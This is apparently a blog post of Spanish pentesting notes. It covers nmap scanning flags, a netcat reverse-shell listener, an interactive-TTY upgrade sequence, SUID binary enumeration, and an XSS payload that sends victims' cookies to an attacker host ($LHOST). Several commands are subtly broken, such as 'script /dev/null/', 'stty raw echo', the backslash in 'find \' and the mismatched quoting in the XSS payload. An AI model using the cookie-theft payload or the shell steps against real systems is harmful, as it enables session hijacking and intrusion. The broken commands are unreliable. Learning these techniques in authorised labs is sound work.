---
title: Apuntes Pentesting V2
published: true
---
Buenas, bienvenidos a mi segunda parte de mis apuntes. Esta es la forma que tengo de pasar a limpio la utilización de algunas herramientas.

# [](#header-1)1. Uso genérico de NMAP.

## [](#header-2)1.1 Escaneo rápido de puertos explicado paso a paso.

```
nmap -sS --min-rate  5000 --open -vvv -n -Pn -p- $RHOST -oN "allPorts"
```

*   **sS** - Permite realizar un SYN scan. Esto permite explorar puertos utilizando únicamente paquetes tipo SYN.
*   **--min-rate 5000** - Indica el número de mínimo de tasa de paquetes.  En este caso (5000)
*   **--open** - Únicamente mostrar los puertos abiertos.
*   **-vvv** - Triple Verbose, para que el estado del escaneo sea mostrado en pantalla.
*   **-n** - Indica al escaneo que no realice resolución de nombres
*   **-Pn** - Indica al escaneo que no haga ping al host.
*   **-p-** - Indica que el escaneo será realizado en todos los puertos.

El uso del parámetro **-oN** es para exportar el resultado del escaneo a un archivo. En este caso llamado. "allPorts"

## [](#header-2)1.2 Enumerar puertos y servicios mediante NMAP.

```
nmap -sC -sV -p(ports) $RHOST -oN "target"
```

*   **-sC** - Realiza análisis con los scripts por defecto.
*   **-sV** - Detección de la versión de los servicios.
*   **-p(ports)** - Indicamos los puertos a analizar, separados por comas.

# [](#header-1)2. Establecimiento de Reverse Shell

## [](#header-2)2.1 Escucha en Netcat de Reverse Shell.
```
nc -nlvp 443
```

Utilizaremos este comando para ponernos en escucha por el puerto 443. Puerto comúnmente usado para el protocolo HTTPS.

## [](#header-2)2.2 Obtención de Shell interactiva.

```
script /dev/null/ -c bash
Ctrl+Z
stty raw echo
fg
reset
xterm
export TERM=xterm
export SHELL=bash
``` 
# [](#header-1)3. Obtención de cookies mediante XSS

**Payload:**

```
<script>document.write('<img src="http://$LHOST/x.jpg?cookie='+ document.cookie +'"></script>')
```

Para el uso de este Payload deberemos instaurar un servidor HTTP, por ejemplo con el módulo de python SimpleHTTPServer, y tras ejecutar el payload, recibiremos una petición GET con dichas cookies.

# [](#header-1)4. Encontrar binarios SUID dentro de un sistema.

Para ello ejecutaremos el siguiente comando:
```
find \ -perm -4000 2>/dev/null
```

Básicamente, buscaremos desde la raíz todos los binarios SUID, y dirigiremos el **stderr** al /dev/null.

